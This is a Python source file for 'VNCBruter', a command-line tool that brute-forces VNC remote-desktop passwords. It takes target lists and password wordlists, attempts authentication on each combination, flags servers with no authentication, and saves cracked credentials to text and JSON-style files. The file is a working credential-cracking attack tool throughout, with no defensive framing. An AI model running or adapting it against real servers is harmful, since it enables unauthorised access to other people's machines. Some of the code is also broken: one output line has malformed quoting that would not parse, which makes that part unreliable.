
#https://docs.python.org/3/library/argparse.html#usage

import argparse
import string
import traceback
import socket
from colorama import Fore, Back, Style
from time import sleep
from datetime import datetime
from ipaddress import IPv4Network
from vnc import VNC, VNCException
import subprocess as sp
import os
from pyfiglet import Figlet

os.system('clear')#Clear terminal
f = Figlet(font='slant')
print(Fore.RED+f.renderText('VNCBruter') + Style.RESET_ALL)
user_array = []
pass_array = []
target_array = []
port_array=[]
success=[]
count=0
connected =False
userIndex=0
PassIndex=0
portIndex=0

parser = argparse.ArgumentParser(description='Tool designed to brute force a vnc server. File will be printed back to terminal and writen out to validAccounts as a txt and JSON documant (in the /root/Documents/Cracked directory), one per line (eg password,127.0.0.1,3380) ')
'''parser.add_argument('-u','--user', dest='usr_file',
                    help='Specify a file of usernames to be tested. Reads a CSV file that contains usernames, one per line')'''
parser.add_argument('--pass', dest='pass_file',
                    help='Specify a password to be tested. ')
parser.add_argument('-P', dest='P_file',
                    help='Specify a file of passwords to be tested. Reads a CSV file that contains passwords, one per line')
parser.add_argument('-l', dest='ip',
                    help='Specify the target and ports to attack (eg 127.0.0.1,5900)')
parser.add_argument('-p', dest='port',default=5900,
                    help='Specify the ports of the vnc server')
parser.add_argument('-lL','--targets', dest='target',
                    help='Specify a file with targets to attack. Reads a CSV file that contains targets and ports, one per line (eg 127.0.0.1,5900)')
parser.add_argument('-t', help='timeout', nargs='?', default=15, type=int, dest='timeout')
parser.add_argument('-O',dest='outputfile', help='Destination of the outputfile')
args = parser.parse_args()
#when using the args --do:
# args.dest -> eg args.usr_file


def hack(addr,port,password, timeout):
    global connected, userIndex, PassIndex, portIndex, count

    try:
        print("Connecting to %s:%d" % (addr, port))
        vnc = VNC(addr, port, timeout)
        try:
            vnc.connect()
        except VNCException as e:
            print("%s:%d\t%s" % (addr, port, vnc.version))
            raise e

            print("%s:%d\t%s" % (addr, port, vnc.version))

        if "None" in vnc.supported_security_types:
            code, msg = vnc.auth("None")
            if code == 0:
                connected = True
                password = ""
        elif "VNC Authentication" in vnc.supported_security_types:
            print("with password:  "+ password)
            vnc = VNC(addr, port, timeout)
            vnc.connect()
            code, msg = vnc.auth("VNC Authentication", password=password)
            #vnc.disconnect()
            if code == 0:
                connected = True
        else:
            print("%s:%s\t%s" % (addr, port, "No supported authentication mechanism"))
        #vnc.disconnect()
    except socket.timeout:
        pass
    except OSError:
        pass
    except ConnectionRefusedError:
        pass
    except VNCException as e:
        print("%s:%d\t%s" % (addr, port, e))
    except Exception as e:
        traceback.print_exc()
    if connected: #if we could connect
        if PassIndex == (len(pass_array) -1):
            if portIndex == (len(port_array) - 1): #if this is the last password and there are no more ports to check on this ip, remove target and set pass and port index back to 0
                target_array.pop(0)
                portIndex =0
                PassIndex =0
            else:
                portIndex = portIndex + 1
                PassIndex = 0
        else:
            PassIndex = PassIndex +1


        #this addr with this username and password works print to screen and add to json and txt files
        print(Fore.GREEN + "Succesful password @ " + Style.RESET_ALL + addr + ":" + str(port) + " Password = " + password )
        success.append(addr+":"+str(port)+" ---> "+password)


        #finaloutput.write("{ \"target\": \""+addr+ ":"+port+"\", \"Username\": \""+usrName+"\", \"Password\": \""+password+"\"}")
        count=count+1

    else: #could not connect
        if PassIndex == (len(pass_array) -1):
            if portIndex == (len(port_array) -1): #if this is the last password and there are no more ports to check on this ip, remove target and set pass and port index back to 0
                target_array.pop(0)
                portIndex =0
                PassIndex =0
            else: #Else if the password is the last to check we dont have a username and password match so move onto next username with same target
                portIndex = portIndex + 1
                PassIndex = 0
        else:#otherwise check the next password with same user and target
            PassIndex = PassIndex +1
        print(Fore.RED+"Invalid Password"+Style.RESET_ALL)
        print()
    #vnc.disconnect()

#file= open("validAccounts.txt","w+")



def main():
    '''
    if(args.usr_file!=None):    #if user flag was set and userfile is not None add users to an array
        with open(args.usr_file) as fp:
            for line in fp:
                user_array.append(line)
'''
    if(args.port!=None):   #if password flag was set and passfile is not None add passwords to an array
        port_array.append(args.port)

    if(args.pass_file!=None):   #if password flag was set and passfile is not None add passwords to an array
        pass_array.append(args.pass_file)

    if(args.target!=None):   #if target flag was set and target file is not None add targets to an array
        with open(args.target) as fp:
            for line in fp:
                x = line.split(",")
                if not x[0] in target_array:
                    target_array.append(x[0])
                if not x[1] in port_array:
                    port_array.append(x[1])

    if(args.ip!=None):   #if this target flag was set and target file is not None add targets to an array
        if "," not in args.ip:
            target_array.append(args.ip)
        else:
            x = args.ip.split(",")
            target_array.append(x[0])
            port_array.append(x[1])


    if(args.P_file!=None):   #if user and password flag was set and target file is not None add targets to an array
        with open(args.P_file) as fp:
            for line in fp:
                x = line.split(",")
                if not x[0] in pass_array:
                    pass_array.append(x[0])
    if len(target_array) == 0:
        print("Please specify target address and port.")
        print("For help type:")
        print("python vncbrute --help")


    if len(pass_array) == 0:
        print("Please specify at least one password to be tested")
        print("For help type:")
        print("python vncbrute --help")

#once array has a username, password and location to attack it must do so.

    while len(target_array) != 0:
        global connected, portIndex, PassIndex
        connected = False

        hack(str(target_array[0]),int(port_array[portIndex]),pass_array[PassIndex],args.timeout)
    if count!=0:
        os.system('clear')
        f = Figlet(font='slant')
        print(Fore.BLUE + f.renderText('VNCBruter'))
        if count ==1:
            print(Fore.GREEN + "1 valid password was found" + Style.RESET_ALL)
        print(Fore.GREEN + str(count) + " valid passwords were found" + Style.RESET_ALL)
        for x in success:
            print(x.rstrip("\r\n"))
        #sprint(Fore.RED + "Happy Hacking :P" + Style.RESET_ALL)
    else:
        print("zero passwords found")





if __name__ == "__main__":
    main()
    if (args.outputfile != None):
        file= open(args.outputfile+".txt","w+")
        json= open(args.outputfile+".json","w+")
        i=0
        for x in success:
            file.write(x)
            x = x.split(":")
            y=x[1].split(" ")
            json.write("target_"+str(i) +"{\n")
            json.write("\tURL:\""+x[0]+"\",\n")
            json.write("\tPort:\""+y[0]+"\",\n")
            json.write("\tPassword:\""+y[2].rstrip("\r\n")+"\,"\n")
            json.write("}")
            i =i +1

        file.close()
        json.close()
